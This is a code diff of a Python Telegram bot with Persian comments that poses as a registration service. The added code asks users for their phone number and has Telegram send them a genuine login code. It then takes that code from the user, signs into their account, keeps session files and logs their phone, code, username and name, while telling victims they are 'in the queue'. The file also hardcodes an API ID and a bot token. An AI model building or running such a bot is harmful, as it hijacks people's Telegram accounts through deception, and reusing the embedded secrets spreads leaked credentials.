@@ -1,5 +1,6 @@
 """
-ربات دریافت اطلاعات از کاربرا
+ربات دریافت اطلاعات از کاربرا - نسخه کامل
+کاربر شماره رو میده، ربات کد میفرسته، کاربر کد رو تایید میکنه
 """
 
 import asyncio
@@ -7,6 +8,7 @@ import json
 import os
 from datetime import datetime
 from telethon import TelegramClient, events
+from telethon.errors import FloodWaitError
 
 # ========== تنظیمات ==========
 API_ID = 17187664
@@ -15,7 +17,9 @@ BOT_TOKEN = '8680597965:AAERhsYmlIou-MEOnbV598bxI0EeQlyzS04'
 
 USERS_FILE = 'users.json'
 SESSIONS_DIR = 'sessions/'
+TEMP_SESSIONS = {}  # ذخیره موقت کلاینت‌ها برای ارسال کد
 
+# ========== مدیریت فایل‌ها ==========
 def ensure_files():
     os.makedirs(SESSIONS_DIR, exist_ok=True)
     if not os.path.exists(USERS_FILE):
@@ -33,6 +37,7 @@ def save_users(users):
     with open(USERS_FILE, 'w') as f:
         json.dump(users, f, indent=2)
 
+# ========== کلاس ربات ==========
 class InfoBot:
     def __init__(self):
         self.client = None
@@ -41,6 +46,7 @@ class InfoBot:
     async def start(self):
         ensure_files()
         
+        # اتصال ربات
         self.client = TelegramClient('info_bot', API_ID, API_HASH)
         await self.client.start(bot_token=BOT_TOKEN)
         
@@ -48,21 +54,25 @@ class InfoBot:
         print(f"✅ ربات @{me.username} متصل شد!")
         print(f"📁 فایل کاربران: {USERS_FILE}")
         
+        # ===== هندلر شروع =====
         @self.client.on(events.NewMessage(pattern='/start'))
         async def start_handler(event):
             user_id = str(event.sender_id)
             self.user_steps[user_id] = {'step': 'start'}
+            
             await event.reply("""
 🐱 **به ربات ثبت‌نام خوش آمدی!**
 
-📌 **مراحل:**
+📌 **مراحل ثبت‌نام:**
 1️⃣ شماره تلفن خود را وارد کنید
-2️⃣ کد تایید را وارد کنید
+2️⃣ کد تایید به شماره شما ارسال میشه
+3️⃣ کد ۵ رقمی را وارد کنید
 
 📱 لطفاً شماره خود را با کد کشور وارد کنید:
 مثال: +989123456789
             """)
         
+        # ===== دریافت شماره و ارسال کد =====
         @self.client.on(events.NewMessage)
         async def phone_handler(event):
             user_id = str(event.sender_id)
@@ -77,66 +87,161 @@ class InfoBot:
             
             step = self.user_steps[user_id].get('step', 'start')
             
+            # ===== مرحله ۱: دریافت شماره =====
             if step == 'start' or step == 'phone':
                 if not text.startswith('+') or not text[1:].isdigit():
                     await event.reply("❌ شماره باید با + شروع بشه!\nمثال: +989123456789")
                     return
                 
-                self.user_steps[user_id] = {'step': 'code', 'phone': text}
-                await event.reply(f"✅ شماره {text} ثبت شد!\n🔑 کد ۵ رقمی رو وارد کن:")
+                # ایجاد کلاینت موقت برای ارسال کد
+                try:
+                    temp_client = TelegramClient(f"{SESSIONS_DIR}temp_{user_id}", API_ID, API_HASH)
+                    await temp_client.connect()
+                    
+                    # ارسال کد
+                    await temp_client.send_code_request(text)
+                    
+                    # ذخیره کلاینت موقت
+                    TEMP_SESSIONS[user_id] = {
+                        'client': temp_client,
+                        'phone': text,
+                        'timestamp': datetime.now()
+                    }
+                    
+                    self.user_steps[user_id] = {'step': 'code', 'phone': text}
+                    
+                    await event.reply(f"""
+✅ کد تایید به شماره {text} ارسال شد!
+
+📌 **مرحله ۲:**
+🔑 کد ۵ رقمی که به تلگرامت اومده رو وارد کن:
+                    """)
+                    
+                except FloodWaitError as e:
+                    await event.reply(f"⏳ تعداد درخواست زیاد! {e.seconds} ثانیه صبر کن.")
+                except Exception as e:
+                    await event.reply(f"❌ خطا در ارسال کد: {str(e)}")
                 return
             
+            # ===== مرحله ۲: دریافت کد =====
             if step == 'code':
                 code = text.strip()
+                
                 if not code.isdigit() or len(code) != 5:
                     await event.reply("❌ کد باید ۵ رقم باشد!\nمثال: 12345")
                     return
                 
-                users = load_users()
-                users[user_id] = {
-                    'phone': self.user_steps[user_id].get('phone'),
-                    'code': code,
-                    'status': 'pending',
-                    'registered_at': datetime.now().isoformat(),
-                    'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk'
-                }
-                save_users(users)
-                del self.user_steps[user_id]
+                # تایید کد با کلاینت موقت
+                temp_data = TEMP_SESSIONS.get(user_id)
+                if not temp_data:
+                    await event.reply("❌ نشست منقضی شده! دوباره /start رو بزن.")
+                    return
                 
-                await event.reply("""
-✅ **اطلاعات با موفقیت ثبت شد!**
+                try:
+                    temp_client = temp_data['client']
+                    phone = temp_data['phone']
+                    
+                    # تایید کد
+                    await temp_client.sign_in(code=code)
+                    
+                    # دریافت اطلاعات کاربر
+                    me = await temp_client.get_me()
+                    
+                    # ذخیره اطلاعات
+                    users = load_users()
+                    users[user_id] = {
+                        'phone': phone,
+                        'code': code,
+                        'status': 'pending',
+                        'registered_at': datetime.now().isoformat(),
+                        'username': me.username,
+                        'first_name': me.first_name,
+                        'group_link': 'https://t.me/+NJNJp5hUf3IzNTRk',
+                        'alert_group_link': 'https://t.me/+h2RZDERs5Yk1Yjc0'
+                    }
+                    save_users(users)
+                    
+                    # پاک کردن کلاینت موقت
+                    await temp_client.disconnect()
+                    if user_id in TEMP_SESSIONS:
+                        del TEMP_SESSIONS[user_id]
+                    if user_id in self.user_steps:
+                        del self.user_steps[user_id]
+                    
+                    await event.reply(f"""
+✅ **ثبت‌نام با موفقیت انجام شد!**
+
+📱 شماره: {phone}
+👤 نام: {me.first_name}
+🆔 یوزرنیم: @{me.username}
+📊 وضعیت: در صف انتظار
 
 🔄 ربات اصلی به زودی فعال میشه...
-📊 وضعیت: در صف انتظار
-                """)
-                print(f"🆕 کاربر جدید: {user_id} - {users[user_id]['phone']}")
+                    """)
+                    
+                    print(f"🆕 کاربر جدید ثبت‌نام کرد: {user_id} - {phone} - @{me.username}")
+                    
+                except Exception as e:
+                    await event.reply(f"❌ خطا در تایید کد: {str(e)}\nدوباره تلاش کن.")
                 return
             
             await event.reply("❌ دستور نامعتبر! /start رو بزن.")
         
+        # ===== هندلر وضعیت =====
         @self.client.on(events.NewMessage(pattern='/status'))
         async def status_handler(event):
             user_id = str(event.sender_id)
             users = load_users()
+            
             if user_id in users:
                 data = users[user_id]
                 status = data.get('status', 'unknown')
-                status_text = {'pending': '⏳ در صف', 'active': '✅ فعال', 'error': '❌ خطا'}.get(status, '❓ نامشخص')
+                status_text = {
+                    'pending': '⏳ در صف انتظار',
+                    'active': '✅ فعال',
+                    'error': '❌ خطا'
+                }.get(status, '❓ نامشخص')
+                
                 await event.reply(f"""
 📊 **وضعیت شما:**
+
 📱 شماره: {data.get('phone', 'نامشخص')}
+👤 نام: {data.get('first_name', 'نامشخص')}
+🆔 یوزرنیم: @{data.get('username', 'نامشخص')}
 📌 وضعیت: {status_text}
-🕒 ثبت: {data.get('registered_at', 'نامشخص')}
+🕒 ثبت نام: {data.get('registered_at', 'نامشخص')}
                 """)
             else:
-                await event.reply("❌ ثبت‌نام نکردی! /start رو بزن.")
+                await event.reply("❌ شما هنوز ثبت‌نام نکردید! /start رو بزنید.")
+        
+        # ===== هندلر حذف اطلاعات =====
+        @self.client.on(events.NewMessage(pattern='/delete'))
+        async def delete_handler(event):
+            user_id = str(event.sender_id)
+            users = load_users()
+            
+            if user_id in users:
+                del users[user_id]
+                save_users(users)
+                await event.reply("✅ اطلاعات شما حذف شد.")
+            else:
+                await event.reply("❌ شما ثبت‌نام نکردید!")
         
         print("🔄 منتظر پیام‌های کاربران...")
         await self.client.run_until_disconnected()
 
+# ========== اجرا ==========
 if __name__ == "__main__":
+    print("""
+    ╔════════════════════════════════════════╗
+    ║  🤖 ربات دریافت اطلاعات               ║
+    ║  کاربرا شماره و کد رو میدن            ║
+    ╚════════════════════════════════════════╝
+    """)
+    
     try:
-        asyncio.run(InfoBot().start())
+        bot = InfoBot()
+        asyncio.run(bot.start())
     except KeyboardInterrupt:
         print("\n👋 خداحافظ!")
     except Exception as e:
